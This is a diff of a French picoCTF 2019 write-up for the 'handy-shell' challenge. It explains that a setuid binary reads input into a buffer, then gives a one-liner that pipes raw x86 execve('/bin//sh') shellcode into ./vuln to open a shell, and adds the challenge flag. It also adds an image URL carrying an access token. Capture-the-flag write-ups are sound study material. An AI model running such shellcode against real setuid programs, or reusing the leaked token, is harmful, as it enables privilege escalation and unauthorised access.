@@ -70,20 +70,10 @@ int main(int argc, char **argv){
 Ce programme utilise un buffer pour lire l'input de l'utilisateur on peut donc s'en servir pour envoyé un shellcode (Il s’agit donc essentiellement d’un morceau de code compilé arbitraire qui peut être injecté dans un programme afin d’engendrer un shell dans le système d’exploitation exécuté par le programme) aprés quelques recherches concernant le shellcode j'ai trouvé ce payload :
 ```bash
 $ (echo -en "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"; cat )  | ./vuln
-
-Et cela confirme ma supposition le programme recupere effectivement un input et à  les mêmes droits qu'etant sudo ou root le bit s nous l'indique et donc reste plus qu'a trouvé un  bon shellcode (google nous répond vite ) qu'on va donner à manger à notre binaire et hop on peut lire notre fichier flag.txt 
-
-Vous pouvez utiliser des blocs de code comme celui-ci:
-
-```bash
-$ nc ctf.teamcryptis.fr 50004
 ...
 ```
 
-![alt text](https://raw.githubusercontent.com/username/projectname/branch/path/to/img.png)
+![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/handy_shell.png?token=AGO2MU5FXFV3CUFTW6EKPDK5WNMVA)
 
-Copier/coller votre commande avec son output, si la sortie de la commande est trop longue, gardez que la partie essentielle.
 
-Et terminez par donner le flag comme ça:
-
-`picoCTF{flag_example}`
+`picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}`
